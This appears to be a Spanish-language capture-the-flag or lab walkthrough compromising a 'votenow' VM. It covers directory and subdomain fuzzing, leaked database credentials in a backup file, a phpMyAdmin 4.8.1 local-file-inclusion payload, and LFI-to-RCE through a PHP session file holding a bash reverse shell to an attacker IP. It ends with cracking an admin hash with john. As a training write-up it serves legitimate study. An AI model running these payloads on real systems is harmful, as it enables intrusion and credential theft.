PORT     STATE  SERVICE  VERSION
80/tcp   open http
2082/tcp open infowave

-En la web del puerto 80 podemos ver un dominio, lo añadimos al /etc/hosts
	-votenow.local

-Hacemos Fuzzing con la siguiente extensión:
	-gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 192.168.1.138 -t 100 -x php.bak
		-/config.php.bak

-Visitamos la ruta '/config.php.bak' y en el código fuente nos encontramos credenciales para BD:
	<?php
		$dbUser = "votebox";
		$dbPass = "casoj3FFASPsbyoRP";
		$dbHost = "localhost";
		$dbname = "votebox";
	?>
	(Las usaremos más tarde)

-Hacemos Fuzzing de subdominios:
	-gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://votenow.local/ --append-domain votenow | grep "Status: 200"
	(Filtramos por Status: 200 por que salían muchos que no valían)
		**datasafe.votenow.local (Subdominio Encontrado!!)**

-En la ruta 'datasafe.votenow.local' , nos encontramos un Login de Phpmyadmin, introducimos las credenciales que obtuvimos anteriormente y entramos!!:
	-Username: votebox
	-Password: casoj3FFASPsbyoRP

-Una vez dentro, miramos la versión de Phpmyadmin:
	Version information: 4.8.1

-Buscamos exploits para esa versión y vemos que es vulnerable a Local File Inclusion (LFI), a través de la siguiente ruta:
	-index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

-Probamos:
	-http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
		-Vemos el /etc/passwd!!

## LFI to RCE

1-Nos vamos al apartado SQL y ejecutamos desde la query el código php malicioso:
	-select '<?php system("bash -i >& /dev/tcp/192.168.1.135/1234 0>&1"); ?>'
2-Apuntamos a sessión dónde se ha guardado el código php:
	-http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_f6e6fmnq5kalieh5ov3rg5e45kfrjitk
	-NOTA: El ID de la sesión lo podemos ver con BurpSuite o con CTRL + C + inspect --> Storage
		bash-4.2$ whoami
		apache

## Escalada de Privilegios

-Ingresamos a mysql con las credenciales que obtuvimos y vemos la contraseña del usuario admin hasheada:
	$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i

-La rompemos con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		Stella
	-su admin:
	-Password: Stella
		[admin@votenow home]$ whoami
			admin

-La escalada a root se escapa el Scope de la certificación